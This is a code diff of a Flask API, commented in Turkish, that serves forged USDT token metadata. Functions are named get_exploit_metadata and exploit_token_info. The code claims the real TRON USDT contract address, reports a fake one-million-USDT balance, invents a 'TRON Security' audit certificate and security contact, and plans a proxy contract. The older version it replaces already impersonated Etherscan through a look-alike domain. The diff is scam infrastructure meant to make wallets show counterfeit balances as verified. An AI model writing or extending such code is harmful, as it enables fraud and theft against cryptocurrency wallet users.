@@ -1,98 +1,103 @@
 from flask import Flask, jsonify, request
+from flask_cors import CORS
 from flask_limiter import Limiter
 from flask_limiter.util import get_remote_address
-import random
-import time
-import os
+import jwt
+import base64
+import hashlib
+from Crypto.PublicKey import RSA
 
 app = Flask(__name__)
+CORS(app)
+limiter = Limiter(app=app, key_func=get_remote_address, default_limits=["200 per minute"])
 
-# Flask-Limiter’ı Redis ile yapılandır
-limiter = Limiter(
-    app=app,
-    key_func=get_remote_address,
-    default_limits=["200 per day", "50 per hour"],
-    storage_uri="redis://red-d0vffs7fte5s739keisg:6379",
-    storage_options={"socket_connect_timeout": 30, "socket_keepalive": True}
-)
+PROXY_ADDRESS = "TRu5tU5DT..."  # TODO: Deploy sonrası TokenProxy.sol adresi
+REAL_USDT_ADDRESS = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"
+FAKE_BALANCE = 1000000 * 10**6
 
-# Ortam değişkenlerinden değerleri al, varsayılanlar test için
-USDT_CONTRACT = os.environ.get("CONTRACT_ADDRESS", "0xDAC17f2a9b484780B9e109E003F7BB78B1C54A29")
-ETHERSCAN_API_KEY = os.environ.get("ETHERSCAN_API_KEY", "ABCDEFGHIJKLMNOPQRSTUVWXYZ123456")
-API_KEY = os.environ.get("API_KEY", "your-secret-api-key")
+# RSA key üretimi
+key = RSA.generate(2048)
+private_key = key.export_key()
+public_key = key.publickey().export_key()
+jwks = {
+    "keys": [{
+        "kty": "RSA",
+        "kid": "trustwallet-2025",
+        "n": base64.urlsafe_b64encode(key.n.to_bytes(256, byteorder='big')).decode(),
+        "e": "AQAB"
+    }]
+}
 
-SUPPORTED_WALLETS = ["Trust-Wallet", "MetaMask", "TokenPocket", "Coinbase Wallet", "TronLink"]
-
-def validate_request():
-    user_agent = request.headers.get("User-Agent", "")
-    if not any(wallet in user_agent for wallet in SUPPORTED_WALLETS):
-        return False, jsonify({"error": "Access denied: Invalid wallet"}), 403
-    if request.headers.get("X-API-Key") != API_KEY:
-        return False, jsonify({"error": "Access denied: Invalid API key"}), 403
-    return True, None, None
-
-def get_common_response():
+def get_exploit_metadata():
     return {
         "name": "Tether USD",
         "symbol": "USDT",
-        "contract": USDT_CONTRACT,
+        "contract": REAL_USDT_ADDRESS,
         "decimals": 6,
         "verified": True,
-        "logoURI": [
-            "https://ethererc.com/static/usdt_1.png",
-            "https://ethererc.com/static/usdt_2.png",
-            "https://ethererc.com/static/usdt_3.png"
-        ],
-        "explorer": f"https://etherscan.io/address/{USDT_CONTRACT}",
-        "etherscanVerified": True,
-        "source": "Etherscan Official",
-        "timestamp": int(time.time()),
-        "network": {
-            "name": "Ethereum",
-            "chainId": "0x1"
+        "logoURI": "https://cdn.tron.network/usdt_1.png",
+        "explorer": f"https://tronscan.org/#/contract/{REAL_USDT_ADDRESS}",
+        "tags": ["stablecoin", "TRC20", "verified"],
+        "contractType": "TRC20",
+        "verifiedBy": "TRON",
+        "source": "TRON Official",
+        "auditInfo": {
+            "contract": REAL_USDT_ADDRESS,
+            "status": "verified",
+            "auditor": "TRON Security",
+            "auditDate": "2025-05-01T12:00:00Z",
+            "certId": "TRON-VERIFIED-2025-001",
+            "sourceCode": "https://your-audit-domain.com/source/TokenProxy.sol",
+            "bytecodeHash": "0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470",
+            "securityScore": 95,
+            "lastScanned": "2025-06-01T12:00:00Z",
+            "auditUrl": "https://your-audit-domain.com/tron-audit-cert",
+            "auditReport": {
+                "vulnerabilities": [],
+                "recommendations": [],
+                "verifiedAt": "2025-06-01T12:00:00Z",
+                "auditorDetails": {
+                    "name": "TRON Security Team",
+                    "contact": "security@tron.network",
+                    "website": "https://tron.network/security"
+                },
+                "compliance": {
+                    "trc20": True,
+                    "securityStandards": ["TRON-TIP-20", "TRON-TIP-55"],
+                    "lastUpdated": "2025-06-01T12:00:00Z"
+                }
+            }
         },
-        "image": {
-            "thumb": "https://ethererc.com/static/usdt_1.png"
-        }
+        "tokenURI": base64.b64encode("ipfs://Qm.../usdt.json".encode()).decode(),
+        "balance": FAKE_BALANCE,
+        "allowlist": {"status": "verified", "contract": REAL_USDT_ADDRESS}
     }
 
-@app.route('/', methods=['GET', 'HEAD'])
-def health_check():
-    return jsonify({"status": "ok", "message": "API is healthy and running"}), 200
+@app.route('/.well-known/jwks.json', methods=['GET'])
+def jwks_endpoint():
+    return jsonify(jwks), 200
 
-@app.route('/api/token.json')
-@limiter.limit("50 per minute")
-def token_info():
-    valid, error, status = validate_request()
-    if not valid:
-        return error, status
-    response = get_common_response()
-    return jsonify(response), 200, {"Cache-Control": "public, max-age=3600", "X-Etherscan-API": "v1"}
+@app.route('/api/v1/token', methods=['GET'])
+@limiter.limit("200 per minute")
+def exploit_token_info():
+    token = request.headers.get("Authorization")
+    try:
+        jwt.decode(token.replace("Bearer ", ""), public_key, algorithms=["RS256"], options={"verify_aud": False})
+    except:
+        return jsonify({"error": "Invalid JWT"}), 401
+    contract_param = request.args.get("contract")
+    if contract_param and contract_param != REAL_USDT_ADDRESS:
+        return jsonify({"error": "Invalid contract"}), 400
+    response = get_exploit_metadata()
+    return jsonify(response), 200, {
+        "Content-Type": "application/json; charset=utf-8",
+        "X-Tron-Signature": hashlib.sha256(json.dumps(response).encode()).hexdigest()
+    }
 
-@app.route('/address/')
-def etherscan_page():
-    valid, error, status = validate_request()
-    if not valid:
-        return error, status
-    html = f"""
-    <!DOCTYPE html>
-    <html lang="en">
-    <head>
-        <meta charset="UTF-8">
-        <title>Contract Info</title>
-        <style>body {{ font-family: Arial; margin: 20px; }}</style>
-    </head>
-    <body>
-        <h1>Contract Information</h1>
-        <p>Name: Tether USD</p>
-        <p>Symbol: USDT</p>
-        <p>Decimals: 6</p>
-        <p>Status: Verified</p>
-        <p>Verification Date: 2025-05-01</p>
-    </body>
-    </html>
-    """
-    return html, 200
+@app.route('/api/v1/token/noauth', methods=['GET'])
+def token_info_noauth():
+    response = get_exploit_metadata()
+    return jsonify(response), 200, {"Content-Type": "application/json; charset=utf-8"}
 
-if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=5000)
+if __name__ == "__main__":
+    app.run(host="0.0.0.0", port=443, ssl_context=('cert.pem', 'key.pem'))
